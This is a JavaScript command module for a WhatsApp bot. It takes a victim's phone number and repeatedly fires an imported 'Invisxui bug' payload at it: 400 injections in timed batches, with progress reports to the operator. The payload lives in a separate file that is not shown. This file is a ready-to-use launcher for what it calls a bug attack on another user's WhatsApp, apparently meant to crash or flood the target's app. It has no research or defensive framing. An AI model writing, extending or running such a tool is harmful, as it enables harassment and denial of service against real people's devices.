import { xUi } from "../xUi.js"; // ton module xUi intact

// Fonction de pause
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Commande invisxui - exécutions en "batches" (plusieurs injections toutes les 2s)
export default {
  name: "invisxui",
  description: "Exécute le bug Invisxui en batches (plusieurs injections toutes les 2s)",
  async execute(sock, m, args) {
    const prefix = ".";
    const q = args.join(" ");
    
    if (!q) {
      return await sock.sendMessage(
        m.key.remoteJid,
        { text: `Contoh: ${prefix}invisxui 237xxxx` },
        { quoted: m }
      );
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const pureTarget = target.split("@")[0];

    // --- CONFIGURATION (modifie si nécessaire) ---
    const batchSize = 4;       // nombre d'injections par exécution
    const intervalMs = 2000;   // 2000 ms = 2s entre chaque exécution (batch)
    const injectionGapMs = 100;// petite pause entre injections dans un même batch
    const totalBatches = 100;  // nombre total de batches à envoyer
    // ------------------------------------------------

    const prosesText = `╔═══════════════════
║  📡 Mengirim bug Invisxui
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Mulai mengirim...
╚═══════════════════`;

    // Image URL à ajouter (initial + final)
    const imageUrl = "https://files.catbox.moe/4185go.jpg";

    // Message initial (avec image + caption)
    await sock.sendMessage(
      m.key.remoteJid,
      {
        image: { url: imageUrl },
        caption: prosesText
      },
      { quoted: m }
    );

    for (let batch = 0; batch < totalBatches; batch++) {
      // Exécution d'un batch : plusieurs injections rapides
      for (let i = 0; i < batchSize; i++) {
        try {
          await xUi(sock, target); // appel de ta fonction importée
        } catch (err) {
          console.error(`Erreur Invisxui - batch ${batch + 1} injection ${i + 1}:`, err.message || err);
        }
        // Petite pause entre injections du même batch pour éviter overlap
        await sleep(injectionGapMs);
      }

      // Message d'update optionnel toutes les X batches (ici toutes les 10)
      if ((batch + 1) % 10 === 0) {
        await sock.sendMessage(
          m.key.remoteJid,
          { text: `Progress: batch ${batch + 1}/${totalBatches} envoyé pour wa.me/${pureTarget}` },
          { quoted: m }
        );
      }

      // Attendre l'intervalle avant le batch suivant (sauf après le dernier)
      if (batch < totalBatches - 1) {
        await sleep(intervalMs);
      }
    }

    const selesaiText = `╔═══════════════════
║  ✅ Bug Invisxui Terminé
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ✅ Semua batches dikirim
║ Note: Ajuste batchSize/interval si perlu
╚═══════════════════`;

    // Message final (avec image + caption)
    await sock.sendMessage(
      m.key.remoteJid,
      {
        image: { url: imageUrl },
        caption: selesaiText
      },
      { quoted: m }
    );
  }
};
